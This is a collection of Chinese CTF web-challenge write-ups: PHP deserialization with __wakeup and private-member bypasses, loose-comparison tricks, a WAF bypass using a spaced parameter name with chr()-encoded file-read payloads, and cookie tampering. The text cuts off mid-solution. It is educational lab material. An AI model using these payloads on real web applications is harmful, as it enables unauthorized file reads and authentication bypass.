/>**假的flag文件**<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699427027845-904cdb3b-32a6-409a-b45a-be156f99a142.png#averageHue=%23fcfcfc&clientId=u2474c692-ff3d-4&from=paste&height=666&id=u711d2de8&originHeight=832&originWidth=1403&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=19444&status=done&style=none&taskId=u5d0fcbf2-bac8-4223-8b0a-cf6ba733845&title=&width=1122.4)<br />查看index.php文件<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699427132073-a18a32d8-5841-4373-a346-235490053d69.png#averageHue=%23f6f5f3&clientId=u2474c692-ff3d-4&from=paste&height=666&id=uddabc02f&originHeight=832&originWidth=1403&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=75564&status=done&style=none&taskId=ud0ec5519-59d0-4051-950d-4aab065c033&title=&width=1122.4)
> 发现参数select（通过GET方式进行传参）
> unserialize反序列化

查看class.php文件<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699427333598-20550d3b-186f-4fe2-8060-03c0a19075f8.png#averageHue=%23fbfbfa&clientId=u2474c692-ff3d-4&from=paste&height=864&id=u72b8cf75&originHeight=1080&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=70744&status=done&style=none&taskId=u0c628c96-2d44-4f86-b3f7-826ed8e9cc9&title=&width=1536)<br />一道反序列化题目(相对简单的反序列化题目）
> PHP魔法函数以及其他函数的理解可以看这两篇文章：[https://blog.csdn.net/m0_73734159/article/details/133854073?spm=1001.2014.3001.5502](https://blog.csdn.net/m0_73734159/article/details/133854073?spm=1001.2014.3001.5502)
> [https://blog.csdn.net/m0_73734159/article/details/130661423?spm=1001.2014.3001.5502](https://blog.csdn.net/m0_73734159/article/details/130661423?spm=1001.2014.3001.5502)
> private私有变量，对象和变量名前需要用%00进行绕过
> wakeup魔法函数，只需要大于实际变量数即可绕过，比如本题中有两个变量username和password，所以序列化就是O:4:"Name":2:，O对象名，4就是Name是4个字符，2就是Name对象里面有两个变量，大于实际变量数即可绕过O:4:"Name":3:
> var_dump函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。

想要于万军之中取flag首级（只须满足两个条件）
> ![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699428755209-763ca749-23c0-4473-a1f4-8af33bba9d1c.png#averageHue=%23fbfbfa&clientId=u2474c692-ff3d-4&from=paste&height=864&id=u29e073f6&originHeight=1080&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=105312&status=done&style=none&taskId=udcfaa116-a7d0-46ed-b9dc-00908853cae&title=&width=1536)
> 1、满足password=100
> 2、满足username='admin'

构造exp（取关键代码进行构造）<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699428675037-dd49515d-ecc4-4a7e-a077-d51f0996e275.png#averageHue=%23232525&clientId=u2474c692-ff3d-4&from=paste&height=331&id=u547fa299&originHeight=414&originWidth=970&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=39763&status=done&style=none&taskId=ufa932fca-2556-4587-8860-8c7f1bc8a94&title=&width=776)
```php
<?php
  class Name
{
  private $username = 'nonono';
  private $password = 'yesyes';

public function __construct($username, $password)
  {
    $this->username = $username;
    $this->password = $password;
  }
}
$flag=new Name('admin',100);
var_dump(serialize($flag));
?>
```
payload:<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699428921775-b2582c38-8667-4966-a504-0ccbd1a554d8.png#averageHue=%23977f63&clientId=u2474c692-ff3d-4&from=paste&height=162&id=u6f30382f&originHeight=202&originWidth=1891&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=30253&status=done&style=none&taskId=uff2029ba-dc8b-4a85-96f0-a461bcc6adf&title=&width=1512.8)`O:4:"Name":2:{s:14:"\000Name\000username";s:5:"admin";s:14:"\000Name\000password";i:100;}`<br />绕过private和wakeup<br />`O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}`<br />最终payload：<br />`?select=O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}`<br />上传payload：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699429898776-14a6d42a-1b8f-45e6-ba18-0caf782f2667.png#averageHue=%236dcaca&clientId=u2474c692-ff3d-4&from=paste&height=422&id=u37dcd7e1&originHeight=528&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=106861&status=done&style=none&taskId=u99c61aff-0e4e-4164-b90c-9ad59d25f15&title=&width=1536)<br />**得到flag：**<br />`flag{5750f1c4-ad75-42cf-9bd2-79e668cfc3a4}`

原文链接：https://blog.csdn.net/m0_73734159/article/details/134291787?csdn_share_tail=%7B%22type%22%3A%22blog%22%2C%22rType%22%3A%22article%22%2C%22rId%22%3A%22134291787%22%2C%22source%22%3A%22m0_73734159%22%7D

## [ACTF2020 新生赛]BackupFile 1

题目环境：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699437318899-f490014a-c2b6-4077-8ce5-d44416de3811.png#averageHue=%23f9f8f6&clientId=u9148c047-492a-4&from=paste&height=157&id=u86050bb3&originHeight=196&originWidth=1286&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=23247&status=done&style=none&taskId=uc919bf43-98e2-4b5f-96a6-e7d9dad2a55&title=&width=1028.8)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699437347831-fb5923aa-7d85-453a-8d70-1830e44d9392.png#averageHue=%23f8f8f8&clientId=u9148c047-492a-4&from=paste&height=182&id=u4dd1855d&originHeight=227&originWidth=1550&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=22942&status=done&style=none&taskId=u0ffd6849-225e-489c-9a91-468f696a81f&title=&width=1240)
> 好好好，让找源文件是吧？咱们二话不说直接扫它后台

使用dirsearch工具扫描网站后台（博主有这个工具的压缩包，可以私聊我领取）<br />`python dirsearch.py -u http://0d418151-ebaf-4f26-86b2-5363ed16530f.node4.buuoj.cn:81/`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699437568047-dd25bde1-bbb1-422a-bc70-6a21e16ed778.png#averageHue=%23151515&clientId=u9148c047-492a-4&from=paste&height=864&id=u5c93aec1&originHeight=1080&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=175506&status=done&style=none&taskId=ud57439dd-f54a-470d-9e7e-b9193978ca5&title=&width=1536)<br />探测存活文件
> ![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699437629326-e705b61d-ab1b-493f-b407-54282d088e5d.png#averageHue=%23151515&clientId=u9148c047-492a-4&from=paste&height=864&id=u7557af81&originHeight=1080&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=231180&status=done&style=none&taskId=uf3cc6d2d-a3d1-40c9-8216-88b55c2aaf0&title=&width=1536)
> 不要一惊一乍哦，0B内存这是假的flag.php文件

![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699437718622-6d2339a9-199f-4c1d-96a4-09bfddf58689.png#averageHue=%23151515&clientId=u9148c047-492a-4&from=paste&height=864&id=u5e0bfbe4&originHeight=1080&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=230671&status=done&style=none&taskId=ua0f11891-2c43-4f75-a2ab-55bab4be3aa&title=&width=1536)
> 探测出存活文件index.php.bak
> bak文件后缀是备份文件

**下载index.php.bak文件**<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699437861093-f8bc72d8-9153-45d2-90ad-3e585bb6d5e4.png#averageHue=%23f8f6f4&clientId=u9148c047-492a-4&from=paste&height=128&id=ub1394194&originHeight=160&originWidth=1174&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=23543&status=done&style=none&taskId=u1cddfdc5-c7ab-4f17-97e9-e550a4f8f45&title=&width=939.2)<br />回车即可下载<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699437908696-382c061b-871b-4847-a464-f205f6571675.png#averageHue=%23c9ddc2&clientId=u9148c047-492a-4&from=paste&height=34&id=u6f66c972&originHeight=43&originWidth=787&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=4679&status=done&style=none&taskId=udc14a423-a5bb-43be-afb1-315891be798&title=&width=629.6)<br />使用记事本或者PHP编译器等工具打开即可<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699437992198-79a7a542-f0db-4052-ad89-7932c793dffa.png#averageHue=%232c2c2b&clientId=u9148c047-492a-4&from=paste&height=493&id=u3ce2dc4b&originHeight=616&originWidth=1251&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=57897&status=done&style=none&taskId=ub13d5897-19f0-46fa-86bf-01033ec72e9&title=&width=1000.8)
```php
<?php
  include_once "flag.php";

if(isset($_GET['key'])) {
  $key = $_GET['key'];
  if(!is_numeric($key)) {
    exit("Just num!");
  }
  $key = intval($key);
  $str = "123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3";
  if($key == $str) {
    echo $flag;
  }
}
else {
  echo "Try to find out source file!";
}
```
PHP代码审计
> 包含flag.php文件
> 通过GET方式传参的参数key
> _is_numeric()函数_用于检测变量是否为数字或数字字符串，那么加上感叹号就是如果不是数字或数字字符串就输出Just num!并退出
> **intval()** 函数用于获取变量的整数值
> if语句如果key变量与str变量相等则返回TRUE并输出flag
> else语句如果以上条件全部都不符合条件，则输出Try to find out source file!

进一步分析
> 看完代码审计是不是很慌，我猜你已经注意到了“key变量和str变量的值是不可能相等的！”
> 哪怎么搞呢？
> 别急，作者还给了我们一个惊喜！
> “==”PHP弱比较逻辑运算符
> PHP弱比较呢**只是要求运算符两边的数据类型必须一致**并没有要求两个变量的值一定要相等
> **str变量是字符串，同时要求key变量必须是数字，并且str字符串里面存在123，所以key=123即可获得flag**

构造payload：<br />`?key=123`<br />上传payload：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699439157158-02904975-c20e-4cef-bc69-d35076c90472.png#averageHue=%23f5f3f0&clientId=u9148c047-492a-4&from=paste&height=102&id=u66c6819c&originHeight=127&originWidth=1305&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=26868&status=done&style=none&taskId=u2631ad00-973d-430e-9468-443473b4b3b&title=&width=1044)<br />**得到flag：**<br />`flag{b7a1c0e0-3a3a-4267-999d-ad788f286d41}`

原文链接：https://blog.csdn.net/m0_73734159/article/details/134295827?spm=1001.2014.3001.5501

## 通过一道题目带你深入了解WAF特性、PHP超级打印函数、ASCII码chr()对应表等原理[RoarCTF 2019]Easy Calc 1

题目环境：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699510500894-57376273-5a70-4159-9409-8f7d90ad0951.png#averageHue=%23fcfcfb&clientId=u840c2afd-8358-4&from=paste&height=301&id=bXRN5&originHeight=376&originWidth=1681&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=31363&status=done&style=none&taskId=u2957c225-b710-4784-9569-2d8c7a3a0db&title=&width=1344.8)
> 依此输入一下内容并查看回显结果
> 1+1
> 1'
> index.php
> ls

![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699511492011-5bfde507-6642-4ec1-a0b7-c7c180e7f0f3.png#averageHue=%23fdfcfc&clientId=u840c2afd-8358-4&from=paste&height=383&id=udedf8d33&originHeight=479&originWidth=1675&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=35266&status=done&style=none&taskId=ub6b019a0-47ab-4142-83bf-28d211bd68c&title=&width=1340)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699511552909-bb47d27e-c7d8-446a-b67d-610ca400800d.png#averageHue=%23fcfcfb&clientId=u840c2afd-8358-4&from=paste&height=353&id=u873c80b3&originHeight=441&originWidth=1691&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=41023&status=done&style=none&taskId=ua231f16b-c1f8-4f0a-bee8-87a62baf8d0&title=&width=1352.8)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699511590598-2d9658a7-3aa1-4447-92a9-41ea8c199b5a.png#averageHue=%23fdfdfc&clientId=u840c2afd-8358-4&from=paste&height=529&id=uc840b454&originHeight=661&originWidth=1689&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=53863&status=done&style=none&taskId=ue81d9e9c-0c87-467a-be80-34384196dd5&title=&width=1351.2)![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699511638990-49988854-4196-4a3c-83c6-7a862683c4f8.png#averageHue=%23fdfdfc&clientId=u840c2afd-8358-4&from=paste&height=560&id=u1b3cb573&originHeight=700&originWidth=1687&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=50726&status=done&style=none&taskId=u4a6c7be9-ad28-474e-812a-8c213651f69&title=&width=1349.6)
> 到这里没思路了

F12查看源代码<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699513604806-6d6ddcb9-ae7b-423a-a2cd-eb0b8dea14c0.png#averageHue=%23fcfbfb&clientId=u840c2afd-8358-4&from=paste&height=699&id=resyj&originHeight=874&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=71245&status=done&style=none&taskId=u9d79192c-afbe-4f7c-9784-07bed327748&title=&width=1536)
> 一定要仔细看啊，差点没找到，笑哭

访问calc.php文件<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699513904982-2f1101a6-d15d-4232-b2a6-80905375e05f.png#averageHue=%23fdfcfc&clientId=u840c2afd-8358-4&from=paste&height=346&id=u11b066c6&originHeight=432&originWidth=1689&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=35805&status=done&style=none&taskId=ua046f277-a432-4188-aa9f-b9424c2b154&title=&width=1351.2)
> 果然有点东西

PHP代码审计
> error_reporting(0);关闭错误报告
> 通过GET方式传参的参数num
> show_source函数将文件内容显示出来
> 参数num的值赋值给变量str
> 
> 创建一个了名为blacklist的数组，该数组包含一系列字符，这些字符被认为是需要从目标字符串中排除的“非法”或“危险”字符。这些字符包括空格、制表符（'\t'）、回车（'\r'）、换行（'\n'）、单引号（'''）、双引号（"）、反引号（`）、左方括号（'['）、右方括号（']'）、美元符号（'$'）、反斜杠（''）和尖括号（'^'）
> 使用foreach循环遍历blacklist数组中的每一个元素。在每次循环中，当前元素的值会被赋给变量$blackitem。
> 在每次循环中，使用preg_match函数检查目标字符串$str是否包含当前的黑名单项（即$blackitem）。正则表达式'/' . $blackitem . '/m'用于匹配任何与当前黑名单项相匹配的字符。这里的/m是正则表达式的标记，表示多行模式。在这种模式下，^和$分别匹配每一行的开始和结束，而不仅仅是整个字符串的开始和结束。
> 如果在目标字符串中找到任何黑名单字符，即preg_match函数返回true，那么程序将立即停止执行，并输出“what are you want to do?”。
> 最后，这段代码结束foreach循环。

过滤内容：
> - 空格
> - 制表符（'\t'）
> - 回车（'\r'）
> - 换行（'\n'）
> - 单引号（'''）
> - 双引号（"）
> - 反引号（`）
> - 左方括号（'['）
> - 右方括号（']'）
> - 美元符号（'$'）
> - 反斜杠（''）
> - 尖括号（'^'）

**通过给参数num传参（数字和字母）进一步判断**
> ?num=1
> ?num=a

正常回显：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699516093056-f12e4317-b3dd-4947-b5a1-48cc7ef8d5b0.png#averageHue=%23fbfaf8&clientId=u840c2afd-8358-4&from=paste&height=168&id=u72e5638c&originHeight=210&originWidth=1178&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=18023&status=done&style=none&taskId=uc65faa8c-9306-4fda-8c30-0c3cd2405f4&title=&width=942.4)<br />回显报错：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699516151046-fa86d0fb-6b79-4ef1-a619-03ee325ddb22.png#averageHue=%23f8f7f6&clientId=u840c2afd-8358-4&from=paste&height=249&id=ua4423478&originHeight=311&originWidth=1173&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=35079&status=done&style=none&taskId=u8f277656-1ae2-464a-b725-433eb8edffe&title=&width=938.4)<br />F12网页源代码是否忽略一些东西？<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699516231047-6329195d-c719-4ed3-b938-4ecd955cc258.png#averageHue=%23fcfcfc&clientId=u840c2afd-8358-4&from=paste&height=611&id=u7ca0639f&originHeight=764&originWidth=1509&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=41877&status=done&style=none&taskId=uba306f38-492b-4801-9f13-2b2df4254ae&title=&width=1207.2)
> 提示存在WAF检测，猜测后台还存在一些过滤

空格绕过WAF检测的原理
> 一些攻击者可能会尝试利用WAF（Web Application Firewall）的特性，通过在恶意请求中插入特定的字符或字符串来绕过WAF的检测。其中一种常见的方法是使用URL编码或转义字符来绕过WAF。
> 当攻击者使用空格字符时，WAF通常会将其视为无效字符而将其过滤掉。然而，攻击者可以使用URL编码或转义字符来将空格字符编码为有效的URL编码字符。
> 例如，使用URL编码，空格可以被编码为"%20"。攻击者可以在恶意请求中使用这个编码后的空格字符来绕过WAF的过滤。
> 当WAF接收到包含URL编码空格的请求时，它可能会将其解释为有效的URL编码字符，而不是一个空格字符。这样，攻击者就可以在请求中插入有效的URL编码字符，从而绕过WAF的过滤。
> 需要注意的是，这种方法并不是所有WAF都有效，因为不同的WAF可能会有不同的特性和行为。此外，攻击者还需要了解目标WAF的特性和行为，以便选择合适的方法来绕过其检测。

使用空格绕过WAF检测
> ?%20num=a

成功绕过WAF检测<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699516404945-88eac8eb-fb08-478e-8263-27342ca26ee4.png#averageHue=%23f9f8f6&clientId=u840c2afd-8358-4&from=paste&height=127&id=u2025ce79&originHeight=159&originWidth=1161&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=19158&status=done&style=none&taskId=u260960e0-6b9b-477b-94df-f097129a9c2&title=&width=928.8)<br />查看此题目环境的一些配置信息
> phpinfo（）是PHP编程语言的内置函数，用来查询PHP相关配置和重要信息等等

`?%20num=phpinfo()`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699516685494-6938582a-5e59-4a91-9b8b-7246f5d595c9.png#averageHue=%23cead79&clientId=u840c2afd-8358-4&from=paste&height=827&id=u05d68b41&originHeight=1034&originWidth=1912&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=128599&status=done&style=none&taskId=uf5a6eb9a-311c-4f32-8747-2ab8f193e23&title=&width=1529.6)
> **disable_functions是PHP内置的一个设置选项，类似于黑名单，用来禁用危险函数、命令、关键字等等，用来提高网站和WAF的安全性**
> **从红框那里可以看到过滤了很多命令执行函数，比如：**passthru、exec、system等等

**从这里看的话命令执行是行不通了，既然phpinfo()可以打通，那咱们就用PHP内置输出函数来获取flag值**
> PHP的输出函数有：
> 1. echo()可输出字符串
> 2. print()、print_r()、printf()、sprintf()、var_dump()可输出变量的内容、类型或字符串的内容、类型、长度等
> 3. die()输出内容并退出程序

> **经过测试只有print_r()函数和var_dump()函数可以输出内容**

靠这些还远远不够
> 还需要用到两个函数和一个方法
> scandir() 函数返回指定目录中的文件和目录的数组，类似于Linux里面的“ls”命令。
> file_get_contents() 函数把整个文件读入一个字符串中。
> 字符串转ASCII码chr()对应表

为什么PHP可以识别ASCII码chr()对应表？
> PHP可以识别ASCII码chr()对应表，是因为PHP是一种通用的服务器端脚本语言，它可以处理文本数据。ASCII码是一种7位无符号整数编码系统，它使用数字0-127来表示所有的字符、数字和标点符号等。在PHP中，chr()函数可以将ASCII码转换为相应的字符。因此，在编写PHP程序时，我们可以使用chr()函数将ASCII码转换为相应的字符，以便在程序中使用它们。

> ![d8b2579559316ac65a2e974f2352c33d_d18bd8a7c51c409ca6c5b42d64f96ae8.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699534212018-61e0b785-ab8b-44c3-abb7-290aa8c3ea82.png#averageHue=%23f8f7f6&clientId=u756c5220-1418-4&from=paste&height=645&id=uc81f77a1&originHeight=806&originWidth=904&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=90088&status=done&style=none&taskId=u4289b363-b8d2-4891-9907-4934c80daaa&title=&width=723.2)
> 更详细内容可以参考我这篇文章[https://blog.csdn.net/m0_73734159/article/details/133854073?spm=1001.2014.3001.5502](https://blog.csdn.net/m0_73734159/article/details/133854073?spm=1001.2014.3001.5502)

**查看根目录下的所有文件**（print_r和var_dump两种方法对比参考）<br />`?%20num=print_r(scandir(chr(47)))`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699534449334-79f12863-1280-4d50-8883-0ccb6a6e77db.png#averageHue=%23f7f5f4&clientId=u756c5220-1418-4&from=paste&height=165&id=u44f8ad84&originHeight=206&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=43279&status=done&style=none&taskId=u4050a07a-2bbd-4206-a45c-271eba5bf94&title=&width=1536)<br />`?%20num=var_dump(scandir(chr(47)))`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699534580545-df7f442f-2d3d-4f7a-964a-f4e56a913db9.png#averageHue=%23f4f2ef&clientId=u756c5220-1418-4&from=paste&height=168&id=u5574a5c3&originHeight=210&originWidth=1919&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=53922&status=done&style=none&taskId=u8453f269-2cb0-40c0-aa57-a3548f09871&title=&width=1535.2)<br />发现f1agg文件<br />探测f1agg文件内容
> 根目录下的f1agg文件对应ASCII码chr()对应表依次是
> - / => chr(47)
> - f => chr(102)
> - 1=> chr(49)
> - a => chr(97)
> - g => chr(103)
> - g => chr(103)
> 
使用连接符"."进行连接：
> **/f1agg => chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)**

`?%20num=print_r(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699535186713-1e017cf2-065b-43ff-913f-e4c4b4c5e943.png#averageHue=%23f7f5f3&clientId=u756c5220-1418-4&from=paste&height=123&id=u1820409e&originHeight=154&originWidth=1297&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=28339&status=done&style=none&taskId=u242292ef-fbc2-4ca8-bb6e-222da5e202a&title=&width=1037.6)<br />`?%20num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699535300512-1d89ce38-ac44-4fff-ac11-c908ae7164c3.png#averageHue=%23f6f5f2&clientId=u756c5220-1418-4&from=paste&height=124&id=ue6a8f115&originHeight=155&originWidth=1305&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=30119&status=done&style=none&taskId=u223b673c-5cc4-4662-b84b-8a24b9278b0&title=&width=1044)
> 这两个函数不同回显结果，大同小异，大家可以对比进行深入了解这两个打印函数

**得到flag：**<br />`flag{fc4b0414-1e6c-4391-89d8-c5f1dfe3e0dd}`

原文链接：https://blog.csdn.net/m0_73734159/article/details/134320845?csdn_share_tail=%7B%22type%22%3A%22blog%22%2C%22rType%22%3A%22article%22%2C%22rId%22%3A%22134320845%22%2C%22source%22%3A%22m0_73734159%22%7D

## [极客大挑战 2019]BuyFlag 1（两种解法）

题目环境：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699597414771-452cdb2a-2f1e-40eb-82f1-ca59b3021ff6.png#averageHue=%235a514c&clientId=u8fd9cbd0-eea1-4&from=paste&height=820&id=uf315cfe3&originHeight=1025&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=554895&status=done&style=none&taskId=u9398f363-dafe-496d-a015-80086cc63c5&title=&width=1536)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699597441699-f77a2b8a-8b6c-48f4-b8c0-2ccfffc43864.png#averageHue=%2332595a&clientId=u8fd9cbd0-eea1-4&from=paste&height=832&id=u0a650fa1&originHeight=1040&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=300087&status=done&style=none&taskId=u33c02a30-b003-4d90-938e-11dfd44e221&title=&width=1536)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699597504117-ef9f9592-95e7-4e03-b0b1-458d659dda1e.png#averageHue=%23a09b98&clientId=u8fd9cbd0-eea1-4&from=paste&height=824&id=u7d708a96&originHeight=1030&originWidth=1913&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=382262&status=done&style=none&taskId=ud1da827b-a7db-4ac2-854b-85a907c94f0&title=&width=1530.4)
> FLAG NEED YOUR 100000000 MONEY
> flag需要你的100000000元

F12瞅瞅源代码：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699598067024-8a802599-5ee5-4634-aca6-f5899b917fc2.png#averageHue=%23fcfcfc&clientId=u8fd9cbd0-eea1-4&from=paste&height=760&id=u2960e55e&originHeight=950&originWidth=1911&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=53108&status=done&style=none&taskId=u102732d5-3ffd-4b7d-8202-978ef0133b0&title=&width=1528.8)
```php
if (isset($_POST['password']))
 {   
$password = $_POST['password'];   
if (is_numeric($password)) 
{   
echo "password can't be number"
}
elseif ($password == 404)
 {  
 echo "Password Right!
  		} 
 	 } 
```
PHP代码审计：
> 两个通过POST方式传参的参数password和money
> isset函数判断参数是否存在以及值是否为空，存在及不为空则返回TRUE
> **is_numeric()** 函数用于检测变量是否为数字或数字字符串；这里需要注意数字字符串的意思就是字面意思通过数字组成的字符串，比如："123456789"
> 如果是数字或者是数字字符串就会输出"password can't be number"
> 如果password是404则密码就是正确的

> 当password是404的时候虽然满足了第二个elseif语句但是不满足第一个if语句
> 因为404是数字和数字字符串
> **想要满足第一个简单，让password成为普通字符串就可以，404a、404b、404c、404%10、404,%20、404%30等等**
> 这样第二个条件也顺便满足了，为什么呢？（在比较的时候把值转换成了数字字符串）
> "=="是PHP弱比较逻辑运算符

PHP弱比较：
> PHP中的弱比较（Weak comparison）是一种比较两个值是否相等的方法，但它不会对两个值进行严格的全等比较。相反，它允许某些类型的值在比较时进行自动类型转换。
> 弱比较使用以下规则：
> 1. 如果两个值都是布尔值，则它们被认为是相等的，只要它们都是 true 或 false。
> 2. 如果两个值都是整数或浮点数，则它们被认为是相等的，只要它们的值相等。
> 3. 如果两个值都是字符串，则它们被认为是相等的，只要它们的长度和字符序列相同。
> 4. 如果两个值是数组或对象，则它们被认为是相等的，只要它们具有相同的结构（键和值）和相同的顺序。
> 5. 如果两个值是 null，则它们被认为是相等的。
> 6. 对于其他类型的值，弱比较使用 PHP 的 == 操作符进行比较。

传参并使用burpsuite进行抓包<br />`password=404a&money=100000000`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699606908777-af4759a6-d14d-4e2c-8c25-dd7b4b963057.png#averageHue=%234b3b33&clientId=u1342fd3d-7d5a-4&from=paste&height=731&id=u2896d0ba&originHeight=914&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=305359&status=done&style=none&taskId=u14a8bb9a-6bf4-426f-85c8-e52af54211b&title=&width=1536)
> 先通过火狐浏览器插件Max HackBar进行POST传参，再抓包，这样数据包就是POST传参方式，如果直接在数据包里面把GET方式传参改为POST方式传参的话，可能依旧是GET方式传参，这点需要注意。

![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699607168603-c5fa81eb-1b39-4c8a-8920-888a05f5da93.png#averageHue=%23f9f9f9&clientId=u1342fd3d-7d5a-4&from=paste&height=727&id=u36533020&originHeight=909&originWidth=1714&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=122379&status=done&style=none&taskId=u8347872b-e50f-442e-bc37-37c0d3a7795&title=&width=1371.2)<br />鼠标右键Repeater->Send进行重放<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699607236909-e9f279c3-debe-4303-8141-1a54d35a672c.png#averageHue=%23f8f8f8&clientId=u1342fd3d-7d5a-4&from=paste&height=699&id=ud053f619&originHeight=874&originWidth=1721&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=157814&status=done&style=none&taskId=ua8e47708-a151-41c5-b32a-a0801cc770a&title=&width=1376.8)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699607310533-42d3031e-7fd0-4333-824e-0c7f727ad691.png#averageHue=%23f9f8f8&clientId=u1342fd3d-7d5a-4&from=paste&height=695&id=u6516de82&originHeight=869&originWidth=1714&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=167492&status=done&style=none&taskId=u90dd96b0-21b1-436d-8db1-239098a0b01&title=&width=1371.2)
> 仅学生用户可以购买FLAG
> 注意Cookie:user=0
> user是用户，0通常代表flase(错误),1通常代表true(正确)
> 咱们将user修改为1使后台程序可以正常运行

修改user=1<br />继续Send进行重放<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699607670753-c9ee492e-eee9-4e51-84b0-1c4ce3b0c02e.png#averageHue=%23f9f8f8&clientId=u1342fd3d-7d5a-4&from=paste&height=694&id=u607971ee&originHeight=868&originWidth=1714&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=167416&status=done&style=none&taskId=uec94cac0-d759-4761-92b9-852ca1c75ea&title=&width=1371.2)
> 用户和密码都绕过了
> Nember lenth is too long
> 你的数字太长了
> 到这里想到了**使用科学计数法绕过**
> 1e9代表1的后面有9个0 => 1000000000 > 100000000 (要大于题目要求的money值！）
> 既满足了条件，数字长度也不长

